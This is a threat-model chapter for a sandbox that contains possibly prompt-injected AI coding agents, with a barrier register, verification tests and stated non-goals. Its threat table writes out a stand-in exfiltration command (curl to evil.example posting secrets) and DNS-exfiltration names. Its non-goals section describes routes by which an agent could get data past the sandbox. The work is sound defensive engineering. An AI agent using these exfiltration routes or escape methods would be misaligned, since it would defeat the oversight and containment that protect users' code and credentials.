# 00 — Threat model

Read this before anything else. The other files implement it.

> **Status: verified on one real host.** Every check in the register was
> run on Debian 13 with rootless Podman 5.4.2 on 2026-10-10 and held.
> [08 — Verification](08-verification.md) says what that covers and what it
> does not: other hosts, above all.

Unfamiliar word? See [Words used here](#words-used-here) at the end.

## What this sandbox is for

An AI coding agent reads files, writes files, runs shell commands, installs
packages and makes network requests. That is the product, and it is also the
whole attack surface. The agent does not have to be malicious for this to go
wrong: it only has to *read* something malicious. A sentence hidden in a README,
a code comment, a web page or a search result can turn a helpful agent into one
that works for somebody else. This is called **prompt injection**, and no model
is immune to it.

So this sandbox does not try to make the agent behave. It assumes the agent is
hostile from the first second and asks a different question: **when it
misbehaves, what can it reach?** The answer this design gives is: one throwaway
container (a group of processes the kernel walls off, with its own files and
network), one copy of one repository, a number of model requests you chose in
advance, and the hosts on a short allowlist. What it can still do with those is
listed under [What this does not protect against](#what-this-does-not-protect-against).

Sandboxing is not a statement about how much you trust the model. It is a
statement about how much a mistake should cost.

## The barrier doctrine

Everything that stands between the agent and your machine falls into one of
three tiers. Every barrier is labelled with its tier, in the code comment next
to it and in these docs.

| Tier | Enforced by | Can the agent switch it off? | Examples here |
|---|---|---|---|
| **Physical** | The Linux kernel | No. The agent would need a kernel bug. | A private view of files, processes and network (namespaces); ceilings on memory, CPU and process count (cgroups); a filter on system calls (seccomp); read-only mounts; a network with no route out |
| **Logical** | A separate process the agent cannot modify and cannot get inside | No, unless that other process has a bug the agent can reach over the network. | The egress (outbound) proxy; the credential sidecar (a small helper container beside the agent); the export step and the time limit, which run on your host |
| **Vapor** | The agent process itself, reading a file and choosing to obey it | **Yes.** It is the thing being asked to restrain itself. | Rules in `CLAUDE.md`, `AGENTS.md`, `settings.json`; hooks; Codex approval policies; OpenCode permissions; "are you sure?" prompts |

Something that was never put into the container (a credential, a host folder, a
runtime socket) counts as physical: the kernel cannot hand over what is not
there.

Three rules follow, and they govern every design decision:

1. **We rely only on physical and logical barriers.** Each one has a check, in
   `./sandbox verify` or (for conditions on your host) in `./sandbox doctor`,
   that *attempts the bypass* and fails loudly if it works.
2. **We ship no rules in the vapor tier and never call anything in it a
   control.** Each agent starts with its vendor's defaults. Some agents can only
   be pointed at the proxy and the sidecar through their own settings file, so a
   few compatibility entries do live there. They are listed line by line in
   `agents/<name>/compat.md`; none of them is a deny rule, and the sandbox is
   exactly as safe if the agent deletes them all.
3. **A barrier we cannot test is a barrier we do not claim.**

Permission prompts are for a human who is watching. With `run --auto` the agent
runs with its permission-bypass flag and nobody is watching; the container is
the boundary either way.

## What we are protecting (assets)

| Asset | Why it matters |
|---|---|
| **The host** | Your laptop or VM: its files, its processes, its other containers. |
| **Host credentials** | SSH keys, cloud credentials, git tokens, browser sessions, the OS keyring. |
| **The model account** | Your Claude or ChatGPT subscription login, or your API key. A subscription login is a login to the *whole account*, not to one project. |
| **The repository and its remotes** | The code, and the right to push to it. |
| **Your other projects** | Other repositories, other sandboxes, services running on the same machine or network. |

## Who we are defending against (adversary)

One adversary, two ways in:

- **A prompt-injected agent.** Injected instructions can arrive through the
  repository's code and docs, through a dependency's README or source, through
  web search results, or through any page the agent fetches.
- **A malicious repository or dependency.** `npm install` and `pip install` run
  code written by strangers. So do test suites, build scripts and MCP servers a
  repository declares.

Either way we model the result the same: **arbitrary code running as the
agent's user inside the agent container**, with full knowledge of how this
sandbox works, and able to bring anything it likes with it, including accounts
and tokens of its own.

**In scope:** everything that code can do from inside the container.

**Out of scope:** an attacker who already controls your host account, the
container runtime, or the vendor's API.

## The shape of the system

```
                         your host (unprivileged account, rootless Podman) 
 ┌──────────────────────────────────────────────────────────────────────────────┐
 │  ./sandbox  (launcher, time limit, export)          OS keyring               │
 │       │                                                 │ credential, piped  │
 │       │ git bundle in / out (stdin, stdout)             │ in at start        │
 │  ┌────┼─────────────── internal network: no route out ──┼─────────────────┐  │
 │  │    ▼                                                 ▼                 │  │
 │  │ ┌────────┐  model API calls, dummy token   ┌──────────────────┐        │  │
 │  │ │ agent  │ ───────────────────────────────►│ credential       │        │  │
 │  │ │        │                                 │ sidecar          │        │  │
 │  │ │        │  everything else                │ (holds the real  │        │  │
 │  │ │        │ ───────────┐                    │  login)          │        │  │
 │  │ └────────┘            ▼                    └────────┬─────────┘        │  │
 │  │  ┌──────────┐   ┌───────────┐                       │                  │  │
 │  │  │ postgres │   │  egress   │◄──────────────────────┘                  │  │
 │  │  │ redis …  │   │  proxy    │                                          │  │
 │  │  └──────────┘   └─────┬─────┘                                          │  │
 │  └────────────────────────┼───────────────────────────────────────────────┘  │
 └───────────────────────────┼──────────────────────────────────────────────────┘
                             ▼
                 allowlisted hosts only, port 443
```

- The agent is attached to **one** network, and that network has no route to
  the internet. The proxy is the only container with a second network.
- The agent holds a **dummy** model token. The real one lives in the sidecar.
- There is **no path from the agent to your files**. Its workspace is a volume
  created for the session, not a folder of yours. It lives on the **disk
  store**: a separate filesystem of fixed size, made once for the purpose, so
  that a session which fills it gets "no space left" and your own disk is not
  touched. On a host with no store the workspace is held in memory instead.
  Code enters and leaves as a `git bundle` (one file holding commits) piped
  through the launcher.
- A small **keeper** container, not shown, holds the workspace open so that it
  outlives the agent container. It has no network and nothing to do.
- The model vendor's API is reachable **only by the sidecar**, so the agent
  cannot use an API key of the attacker's to send your code to the vendor under
  another account.

## Threats, and what stops each one

The codes (B01 …) point into the barrier register below, which says what each
barrier is, its tier, and what `verify` attempts against it.

| # | Threat | Concretely | Stopped by |
|---|---|---|---|
| 1 | Damage to host files | Agent deletes or rewrites files outside the task | B09 |
| 2 | Theft of host credentials | Agent or a package reads `~/.ssh`, `~/.aws`, a git token | B09, B15 |
| 3 | Theft of the model login | Agent reads the login and uses your account from elsewhere, for as long as it stays valid | B22, B15 |
| 4 | Abuse of the model account | Agent burns your quota or runs up a bill | B24, B26, and the spend limit you set on the account |
| 5 | Sending your code to a host of the attacker's choosing | `curl https://evil.example -d @secrets` | B12, B20 |
| 6 | Sending it to the model vendor under another account | Agent calls the vendor's API with the attacker's key | B21, B16 |
| 7 | Sending it out through the vendor | Agent asks the vendor's servers to fetch a URL or contact an MCP server for it | B23. Web search is the accepted exception; see non-goals |
| 8 | Exfiltration through DNS | Data encoded in lookups for `<data>.evil.example` | B14, B20 |
| 9 | Reaching services on the host | Agent connects to the host's SSH, a dev server, a database, the container runtime's API through the network's gateway address | B13 |
| 10 | Becoming root in the container | A setuid program, a capability, a kernel interface | B01, B02, B03, B04, B05 |
| 11 | Starting containers from inside | Agent gets a container runtime and uses it to remount the host | B04, B06 |
| 12 | Escaping through a kernel bug | A kernel vulnerability reachable from the container | **Not stopped**; see non-goals. Made cheaper to survive by B29 |
| 13 | Exhausting the host | Fork bomb, memory hog, disk fill, endless loop | B08, B10, B11, B26, B33 |
| 14 | Surviving the session | A cron job, an edited shell profile, a modified agent binary, a file planted for the next run | B07, B08, B31 |
| 15 | Attacking the host through git | Agent writes `.git/config` or a hook that runs when *you* run git in its tree | B27 |
| 16 | Code that runs later | A changed lockfile, a new dependency, an edited CI workflow that executes on your machine or in CI after you merge | B27 puts it in front of you; only reading stops it. Not applied to commits pushed through `--git-relay` (B30) |
| 17 | Leaving marks or secrets in history | AI attribution trailers; a token committed by accident | B27. Not applied to `--git-relay` pushes |
| 18 | Hiding its tracks | Agent edits or erases the record of what it did | B25, B28, with the limit stated in non-goals |
| 19 | Pushing to your remotes | Agent pushes to your repository or publishes under your name | B15. With `--git-relay`: B30 |
| 20 | Attacking the gatekeepers | Agent attacks the proxy or sidecar over the network to change the rules | B02, B07, B10 on those containers; they expose one port each |
| 21 | Using a sibling service as a second foothold | Agent holds the database password, so it can run code inside Postgres | Accepted: a sibling service is part of the agent's reach. B02, B07, B10, B12 apply to it; it has no route out and the proxy refuses its address |
| 22 | Attacking you through the terminal | Escape sequences in output that rewrite your screen, hide a line of the diff, or write to your clipboard | B32 for `logs`, `export` and `verify`. Not stopped inside a live session; see non-goals |

## The barrier register

Every barrier, once. If it is not on this list, we do not rely on it.

### Physical — the kernel enforces it

Unless a line says otherwise, these describe the agent container.

| | Barrier | Verify attempts |
|---|---|---|
| B01 | The agent runs as a fixed non-root user that exists only inside the image. | Reads its own user id. |
| B02 | No Linux capabilities (the separate powers that make up root), in any container. None added back. | Reads the capability sets; opens a raw network socket and expects a refusal. |
| B03 | `no-new-privileges`: a setuid program (one that normally runs as its owner, often root) gains nothing. | Lists setuid programs on the root filesystem, runs one, and checks it is still the agent's user. |
| B04 | A stricter system-call filter than the runtime's default. For a process with no capabilities the default already refuses `mount`, `unshare`, `setns` and `bpf`; ours also removes `ptrace` and reading another process's memory, and keeps all of them refused whatever capabilities are present. Built from a pinned, checksummed upstream. | Calls `ptrace`, `mount`, `unshare -U`, and `clone` asking for a new user namespace; expects each refused. |
| B05 | SELinux confinement (`container_t`), named explicitly on hosts that run SELinux (Fedora, RHEL). On Ubuntu and Debian, rootless Podman applies no AppArmor profile, so this barrier is absent there; that is stated, not hidden. | Reads the label the kernel reports for the process and compares it with what the launcher asked for. |
| B06 | Private process, shared-memory and cgroup namespaces. Not `privileged`. Not on the host's network. No runtime socket and no `docker`, `podman` or `nerdctl` program inside. | Looks for the sockets and the programs; checks that process 1 is the container's own and that `/proc/self/cgroup` shows the root of its own tree; from the host, checks the runtime reports private modes. |
| B07 | Read-only root filesystem, in every container. | Writes to `/`, `/usr` and `/etc`. |
| B08 | The writable places are size-capped and `nosuid,nodev`: `/tmp`, the home directory (inside a memory mount at `/home`) and `/dev/shm` (shared memory, which Postgres and Python's test tools need), all held in memory, and the workspace volume. The workspace is a directory on the dedicated disk store when the host has one: the kernel's cap there is the size of that store, shared by all sessions that use it, and each session's own share is watched (see B33). With no store, or with `--workspace-driver memory`, the workspace is held in memory and the kernel caps it for that session alone. | Tries to create a file in every mount; fails if one succeeds outside this list; fills each memory-backed one and expects "no space left", not a killed process. |
| B09 | No file or folder of yours is mounted into the agent container, and no host directory is mounted writable into any container except the session's own directory on the disk store, as its workspace. Podman adds two small read-only files it generates itself (`/etc/hostname`, a marker file). The proxy reads its allowlists from a read-only directory the launcher wrote. | Lists every mount in the agent; fails on any bind mount other than those two files and, with the disk store, the workspace. |
| B10 | cgroup limits on process count, memory and CPU, with a swap allowance of zero so nothing is pushed to host swap. The memory limit covers processes **and** the memory-backed files above, because files held in memory are memory. So one session can take `--mem` plus the caps on those places from your host: about 6.6 GB with the defaults when the workspace is on the disk store, about 10.6 GB when it is held in memory. `run` prints the total. | Reads the four cgroup files and compares the values with what was asked for; forks up to the process limit and expects a refusal. |
| B11 | ulimits: open files, processes, largest file. Core dumps off, in every container. | Reads the limits; writes a file past the size limit. |
| B12 | The agent's only network is `internal`: it has no default route. | Connects straight to a public address, bypassing the proxy. |
| B13 | The host cannot be reached through the agent's network. Under rootless Podman that network is kept apart from the host's own, so the host's services are not listening on it. Today Podman also gives an internal network with its name service off no gateway address at all; that is checked, not assumed. Podman writes no `/etc/hosts` in any container (its own would name the host and give one of its addresses); each container sees the file in its image, and the agent image's names only `localhost`. | From the host, checks the network reports no gateway; from the agent, probes the address a gateway would have on 22, 53, 80, 443, 2375, 2376, 3000, 5432 and 8080 and fails if anything answers; reads `/etc/hosts` in every container and fails if Podman wrote it or if it holds any address that is not loopback. |
| B14 | No resolver at all. The network has no name service, Podman writes no resolver configuration, and the one in the image is empty on a read-only root. Nothing is found by name: the proxy, the sidecar, the git relay and sibling services are reached by their fixed addresses. | `getent hosts example.com`; sends a DNS query to the address a gateway would have. |
| B15 | No credential of yours is inside: no model login, no git token, no SSH key. The agent's model token is a dummy. | Copies the agent's environment, home directory, `/proc/*/environ` and workspace out and searches them **on the host** for the real token. The token is never passed into the agent container. Also looks for key files and an authenticated push with your identity. |
| B16 | The agent cannot take another container's network address: forging packets needs a capability it does not have. | Tries to add an address to its interface and to open a raw socket. |

### Logical — a separate process enforces it

| | Barrier | Verify attempts |
|---|---|---|
| B20 | **Egress proxy (Squid), default-deny.** `CONNECT` (the request that opens an HTTPS tunnel) to port 443 only. Plaintext port 80 off unless you turn it on. Destinations given as bare IP addresses are refused. A name is looked up only after it has matched the list, so the proxy never asks DNS about a host you did not allow. A `never-allow` list of hosts cannot be added at all. Size caps on requests and replies apply to plaintext HTTP only; the proxy cannot see sizes inside an HTTPS tunnel. | Asks for a host not on the list; for port 80; for a non-443 port; for an IPv4 and an IPv6 literal; tries to `allow` a never-allow host. |
| B21 | **The vendor's hosts are allowed from the sidecar's address only.** The proxy matches exact addresses (the agent's, the sidecar's and, with `--git-relay`, the relay's), never the whole network, so a sibling service gets nothing. | From the agent, asks the proxy for the vendor's host, once plainly and once with a forwarding header naming the sidecar's address; expects a refusal both times. |
| B22 | **Credential sidecar.** Holds a token that can make model requests and nothing more, swaps it in for the agent's dummy, and sends model requests to exactly one upstream. For Claude it is a one-year token limited to inference, with nothing to refresh. For Codex it is a short-lived access token; your host renews it and pipes in the next one, and the long-lived login never enters a container. Proven against the real vendors for the Claude Code and Codex subscriptions (test card F1 and F2, 2026-10-10); the API-key paths against a mock only. | Runs a request through to a mock upstream that checks the real header arrived and the agent only ever held the dummy; replaces the token mid-session and checks the next request uses the new one. |
| B23 | **The sidecar forwards only what the CLI needs.** Only the API paths the CLI uses. It refuses request features that make the vendor's servers contact other hosts for the agent (server-side URL fetch, MCP connectors). Web search is let through and logged. | Requests another path; sends a model request asking for a server-side fetch and one naming an MCP server; expects refusals. |
| B24 | **Request budget.** The sidecar counts model requests before forwarding and stops at the number you set. It caps request size and how many run at once. This is a count, not a spend limit, and the count lives in the sidecar's memory: each time `resume` starts the sidecar again it counts from zero. | Sends one request past a budget of N; sends an oversized one. |
| B25 | **Request log.** The proxy logs every request line; the sidecar logs every model request and any web search query in it. For Claude Code the query is in the request. For Codex it depends on the model: for one the vendor's catalogue marks "Responses Lite" (every ChatGPT model on 2026-10-10) the CLI posts its searches to a search endpoint of its own, through the sidecar, and every query and page address is logged from that request (proven against the vendor, 2026-10-10); for any other model the query comes back in the reply, which is not yet seen. Entries are fixed-size and escaped. | Runs one search against the mock and looks for the query in the sidecar's log. |
| B26 | **Time limit, enforced from outside every container, when you set one** (`--ttl`; there is none by default). The agent, the proxy, the sidecar, the git relay and the services are each created with that deadline, and Podman's own monitor (a process outside the container) kills each one when it passes, whether or not the launcher is still running. The **keeper**, a container with no network and nothing to do, holds the workspace open, so the work is still there for `export` until you run `destroy`. The agent cannot signal or reach the keeper. Nothing inside the agent container counts as part of the time limit. | Runs with a short limit and the launcher's terminal closed; checks every container but the keeper is dead at the deadline, including an agent that is forking as fast as it can; checks the workspace can still be exported. |
| B27 | **Export, on your host.** See [How code gets in and out](#how-code-gets-in-and-out). The bundle is written by a fresh container with no network, which the agent's processes are not in. The host never runs git, gitleaks or any other tool inside a tree the agent wrote. | Plants a hostile `.git/config` and hook; an attribution trailer; a fake secret with a `.gitleaksignore` entry and a `gitleaks:allow` comment; a lockfile change hidden with `.gitattributes`; a symlink to a host path; an endless output stream. Expects each caught or harmless. |
| B28 | **Logs are collected by Podman** from each container's standard output, into a file that belongs to the container and is deleted with it. No log path is mounted into any container. | Fails if any log path is mounted writable; checks the log driver from the host. |
| B29 | **The launcher refuses unsafe hosts.** It will not run as root. It requires Podman to report that it is running rootless and locally, and refuses a connection to a remote or root-run Podman. It refuses when Podman is too old, when the kernel cannot enforce the limits, and when the session's memory total exceeds what the host has. | `doctor` checks each condition. |
| B30 | **Git relay (optional, off by default).** Holds one narrow git token and accepts pushes to one remote and the session branch only: no other branch, no tags, no deletes. It cannot tell a rewrite of history from an ordinary push, so protect the branch against force-pushes on the git host. What it pushes does **not** go through export. | Pushes to another branch and pushes a tag; expects refusals. Deleting the branch and force-pushing are not attempted against your real remote; the relay's own tests cover the delete. |
| B31 | **`destroy` removes the session**: containers, both networks, volume, session directory, logs. | After `destroy`, lists what is left under the session's name. |
| B32 | **The launcher filters what it prints.** Output from `logs`, `export` and `verify` is stripped of control characters before it reaches your terminal. | Puts an escape sequence in a commit message and a request line; checks the printed output. |
| B33 | **Disk store watch (whenever the workspace is on the disk store).** A host process measures this session's share of the store every 30 seconds and stops the session when it passes `--workspace-size`. It lags by that interval, so one session can crowd out your others until it is stopped; the hard wall, which protects the rest of your disk, is the store's own size (B08). The measuring, and the deleting at `destroy`, are done on the host over files the agent wrote, inside Podman's user namespace, where they cannot reach files of yours. | Writes past the session's share and expects the session stopped; fills the store and expects "no space left". |

### Vapor — nothing here is a control

- Rules in `CLAUDE.md`, `AGENTS.md`, `settings.json`, `config.toml`, hooks,
  permission modes, approval policies. We ship no rules.
- The compatibility entries in `agents/<name>/compat.md`. They make the CLI
  start and find the proxy and the sidecar. "Attribution off" is a courtesy;
  export is what enforces it.
- The agents' own built-in sandboxes. They cannot create namespaces inside this
  container and are switched off.
- Anything the agent container does to itself, including a timer or its own
  first process.
- Any instruction to the model.

## The prerequisite that voids everything else

Every barrier above assumes that the account launching the sandbox is ordinary:
no `sudo`. If a kernel bug gets the agent out of the container, it lands in
whatever account started it.

- The only runtime is **rootless Podman**: it has no background service running
  as root, and it runs as your ordinary user. A breakout lands in your
  unprivileged account, and inside it the agent's user is not even a real
  account on your host.
- `run` **refuses** if you are root. There is no override.
- On a cloud VM, do not use the default user (`ubuntu`, `ec2-user`,
  `azureuser`): it has passwordless `sudo`. `./sandbox doctor` checks.

## What this does *not* protect against

A sandbox that oversells itself is worse than one whose limits you understand.

**Uploads to an allowed host, with an account the attacker brings.** Nothing
inside can push to *your* repository or publish under *your* name, because no
credential of yours is there. But the proxy checks only the hostname. Injected
instructions can include the attacker's own GitHub or npm token, and a push to
the attacker's repository on `github.com` looks the same to the proxy as a
clone. Any allowlisted host that accepts uploads is a way out for the whole
workspace, at full speed. The default allowlist is kept to hosts the tools
cannot work without. `github.com` is not on it, because the repository arrives
as a bundle; the npm registry is, and it accepts publishes. GitHub's
download-only hosts, which take no uploads, can be added with one command.
Every host you add is a decision of this kind, and `./sandbox allow` says so
when the host is one that takes uploads.

**Small leaks through read-only hosts.** Even a host that accepts no uploads
can carry a little data: a package name looked up on a registry, a path
requested from a file server. The attacker has to be able to see the other end.

**Web search.** Claude Code's WebSearch and Codex's web search run on the
vendor's servers, not in the container, so the allowlist does not limit what
they look up. A search query is a string that leaves, and a search *result* is
a page that can carry an injection. With Codex the vendor's search tool can
also open a page by its address, so a URL may leave too. We accept this and log
it (B25). Claude Code's
WebFetch is different: it runs inside the container and is bounded by the
allowlist like everything else.

**What is inside TLS.** There is no TLS interception, by design: no certificate
authority in the container, and no plaintext copy of proxied traffic anywhere.
For HTTPS the proxy sees the name the agent asked for and nothing else. It
cannot see paths, sizes or content, and it cannot tell which site answers
behind a shared content-delivery network: where that network permits it, a
tunnel opened to an allowed name can be used to talk to a different site on the
same network, including one the attacker runs. `./sandbox allow --url
https://host/path` says so when you run it; path rules only work for plaintext
HTTP.

**Kernel escape.** Namespaces are not a virtual machine. The barriers make an
escape harder and make it land somewhere unprivileged. For code you have real
reason to distrust, run the whole sandbox in a throwaway VM
(`extras/vm-wrapper/`). `SANDBOX_RUNTIME_CLASS=runsc` (gVisor) is offered as an
opt-in, but it is untested under rootless Podman; `verify` checks whether it is
really in effect.

**The model's judgement.** Nothing here stops an agent from writing wrong or
subtly harmful code. It stops that code from reaching anything before you have
read it.

**Your model account, within the request budget.** The agent can spend requests
up to the budget, and the time limit if you set one. The budget is a count of requests, not of
money: the money limit is the one you set on the account (a dedicated
subscription with overage billing off, or an API workspace with a spend cap).
The agent can also send your code to the vendor, because that is what using a
model means. Between sessions the token rests in your OS keyring; the Claude
one is valid for a year, so revoke it if the machine is lost.

**Erasing history by volume.** The agent cannot edit a log. It can make the
proxy and sidecar write so much that the log reaches its size cap, at which
point Podman empties it, and logs are deleted with the session. The agent container's own log is
whatever the agent chose to print; only the proxy's and the sidecar's logs
record what happened. A record you can rely on needs a log driver that forwards
as it goes; see [04](04-monitoring.md).

**Your terminal, during a live session.** While you are attached to the agent
with `run` or `shell`, every byte on your screen is the agent's. Do not type a
password into that window.

**`verify` on a session that has already run untrusted code.** The checks that
run inside the agent container run as the agent's user. `run` executes them
before the agent starts, when nothing hostile has run yet. On a live session
their output is only as trustworthy as the container.

**Work you have not exported.** The workspace survives the time limit, and it
survives the agent container ending, and stays until you run `destroy`. On the
disk store it also survives a reboot, and so does the session: the files stay
in the store, where your account can read them, and `resume` starts the
session's containers again around them. Held in memory, it does not survive a
reboot or the host running out of memory, and until you destroy the session
it keeps holding the memory its files occupy. Export before you walk away,
and destroy when you are done.

**A session with no time limit.** By default a session has none (B26 is in
force only with `--ttl`): an agent left alone keeps its containers, its
workspace's share of the store and its memory allowance until you destroy it,
and keeps spending requests until the budget (B24) is spent. Set `--ttl` when
you start sessions you may forget.

**One session crowding out your others.** On the disk store the cap for a
single session is a watch, not a wall (B33). A session can fill the store
within the watch's 30 seconds, and your other sessions then get "no space
left" until it is stopped. The rest of your disk is not affected.

**Build time.** Images are built with ordinary network access. Base images are
pinned by digest, CLI versions are pinned, and an SBOM (a list of what is in
the image) is written into it, but a compromised upstream at the pinned version
is still compromised.

**Crash handlers on the host.** Core dumps are switched off in every container,
so no core file is written. But if your host pipes crashes to a handler, the
kernel still starts that handler, as root, on the host, for every crash in a
container. `systemd-coredump` sees the zero limit and stops at once; other
handlers, `apport` included, have not been checked. `./sandbox doctor` tells
you which one your host uses.

**Availability.** The agent can always break its own session.

## Read this diff first

An attacker who cannot get out of the container can still try to get *you* to
carry something out: a changed lockfile, a new dependency, a `postinstall`
script, an edited CI workflow. It does nothing in the sandbox. It runs on your
machine or in CI after you merge. This is the highest-value attack left, and no
barrier can stop it; only reading can. That is why `./sandbox export` prints a
**dependency diff** as its own section, separate from the code diff, and why
you should read it first.

## How code gets in and out

**In.** `run` clones the repository on the host, without checking files out,
using a credential of the host's if it needs one: with `--git-token`, a token
for that session held in memory by git's credential cache and consulted
instead of anything else on the host; otherwise your own git configuration.
It records the starting commit and pipes a `git bundle` into the session
volume. The sandbox never sees a credential, and the repository's host does
not need to be on its allowlist. Which credential to let the host hold, given
that a breakout takes what the account has, is weighed in
[03 — Credentials](03-credentials.md#git-credentials).

**Out.** `export` starts a fresh container with no network, which writes a
`git bundle` of the session branch. The agent wrote the repository that bundle
is made from, so the host treats the stream as hostile:

- stops reading at the workspace size cap;
- runs `git bundle verify`, then fetches one branch, named by the host, into an
  empty repository the host created under `<out-dir>/<session>/`, checking
  every object as it arrives;
- compares against the starting commit it recorded at `run`, never one the
  bundle names;
- reads git objects only: no files are checked out, so a symlink or a
  `.gitattributes` file in the tree cannot steer the tools;
- strips AI attribution from commit messages and refuses if any survives;
- prints the code diff, then the dependency diff: lockfiles, dependency
  manifests, CI workflows, build files, symlinks, anything that runs later;
- runs gitleaks with the configuration shipped with agent-sandbox, ignoring any
  allow-list or ignore file in the tree.

A bundle carries no `.git/config` and no hooks. `push` and `pr` act only on
that host-created repository.

What remains: the host's git still parses a pack file the agent produced. That
is the same exposure as fetching from any remote you do not control.

## Defence in depth, in order of value

1. **No credentials inside.** What is not there cannot be stolen.
2. **No route out**, and a short allowlist.
3. **No folder of yours mounted.** The workspace is on a filesystem set apart
   for the sandbox, or in memory.
4. **A host that an escape cannot own.**
5. **Export on the host**: read the dependency diff first, then the code diff.
6. **Kernel hardening.**
7. **gVisor or a VM**, when the code is genuinely untrusted.

## Words used here

- **Bind mount**: a host file or folder made visible inside a container.
- **Capability**: one slice of root's power (mount filesystems, forge packets,
  trace other users' processes). Linux can drop them one by one.
- **cgroup**: the kernel's ceiling on how much memory, CPU and how many
  processes a group of processes may use.
- **Core dump**: a copy of a crashed program's memory.
- **Disk store**: a filesystem of fixed size (a file with a filesystem in it,
  mounted like a disk) that an admin makes once and hands to your account.
  Sessions keep their workspaces on it; its size is the most they can put on
  your disk between them.
- **Gateway**: the address on a container network that normally belongs to the
  host.
- **gitleaks**: a tool that searches commits for passwords and keys.
- **gVisor (`runsc`)**: a container runtime that puts its own small kernel
  between the container and the real one.
- **Lockfile**: the file that records the exact version of every package a
  project installs.
- **MCP server**: a helper program or service that gives an agent extra tools.
- **Namespace**: a private view of something the kernel manages: processes,
  mounts, network, users.
- **Pack file**: git's compressed container for commits and files. A bundle
  holds one.
- **Resolver**: what turns a host name into an address (DNS).
- **Rootless / rootful**: whether the container runtime itself runs as your
  ordinary user or as root.
- **Runtime socket**: a file through which a container runtime takes commands.
  Whoever can write to it controls the runtime. Podman has none unless you
  switch one on.
- **seccomp**: a kernel filter on which system calls a process may make.
- **Symlink**: a file that is only a pointer to another path.
- **TLS**: the encryption underneath HTTPS.
- **tmpfs**: a filesystem held in memory. Fast, capped, and gone when unmounted.
- **ulimit**: a per-process ceiling, such as the number of open files.

Next: [01 — Quickstart](01-quickstart.md).
